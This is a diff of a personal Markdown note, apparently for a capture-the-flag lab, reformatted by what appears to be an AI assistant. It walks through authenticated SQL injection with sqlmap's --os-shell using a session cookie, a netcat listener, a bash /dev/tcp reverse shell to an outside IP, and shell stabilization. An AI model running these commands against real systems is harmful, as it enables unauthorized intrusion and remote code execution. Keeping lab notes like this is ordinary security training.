@@ -1,37 +1,76 @@
 ---
-title: 
+title: SQLMap
 draft: false
 tags:
-  - tag1
-  - tag2
+  - sqlmap
+  - sql
 NeedsReview: true
 ---
+Here's your note converted into proper Markdown format for your Obsidian vault under the appropriate UKC category:  
+**Exploitation**, since it involves SQL Injection via `sqlmap` and remote command execution.
 
-# {{title}}
+---
 
-> [!abstract] Summary  
-> A brief description of this note.  
+```markdown
+---
+title: SQL Injection with Session Cookie - Exploitation  
+draft: false  
+tags:  
+  - sqlmap  
+  - exploitation  
+  - reverse-shell  
+NeedsReview: false  
+---
+> [!summary] Core Concept  
+Use an active PHPSESSID cookie to perform SQL injection and gain OS shell access using sqlmap, leading to remote code execution.
 
-Using known accessed cookie for user login (PHPSESSID), Inject SQL DB
+### 🎯 Target
 
-sqlmap -u [http://megacorp.hbt/dashboard.php?search=](http://megacorp.hbt/dashboard.php?search=) --banner --os-shell --cookie=PHPSESSID=7alvo0vrdehj4cafl8u1pccfa1
+- Web Application: `http://megacorp.hbt/dashboard.php?search=`
+- Session Cookie: `PHPSESSID=7alvo0vrdehj4cafl8u1pccfa1`
 
-Let's run a bash reverse shell for our service running: # nc -lvnp 443
+### 🛠️ Tool Used
 
-os-shell> bash -c "bash -i >& /dev/tcp/10.10.15.146/443 0>&1"
+- `sqlmap` (SQL injection automation)
+- Netcat (`nc`) for reverse shell
+- Python (`pty.spawn`) for shell stabilization
 
-We beautify the reverse shell:
+### 📌 Attack Steps
 
-$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+1. **Initial SQL Injection via Cookie Authentication**  
+   Leverage a valid session cookie to perform authenticated SQL injection:
 
-CTRL+Z
+   ```bash
+   sqlmap -u "http://megacorp.hbt/dashboard.php?search=" --banner --os-shell --cookie="PHPSESSID=7alvo0vrdehj4cafl8u1pccfa1"
+```
 
-stty raw -echo
+2. **Trigger Reverse Shell via OS Shell**
+    
+    Open a listener on your Kali machine:
+    
+    ```bash
+    nc -lvnp 443
+    ```
+    
+    Then, in the `sqlmap` os-shell prompt:
+    
+    ```bash
+    bash -c "bash -i >& /dev/tcp/10.10.15.146/443 0>&1"
+    ```
+    
+3. **Stabilize Reverse Shell**
+    
+    On your listener terminal after connection:
+    
+    ```bash
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+    ```
+    
+    Then press `CTRL+Z` and type:
+    
+    ```bash
+    stty raw -echo
+    fg
+    export TERM=xterm
+    ```
 
-fg
-
-export TERM=xterm
-
-Using known accessed cookie for user login (PHPSESSID), Inject SQL DB
-
-sqlmap -u [http://megacorp.hbt/dashboard.php?search=](http://megacorp.hbt/dashboard.php?search=) --banner --os-shell --cookie=PHPSESSID=7alvo0vrdehj4cafl8u1pccfa1
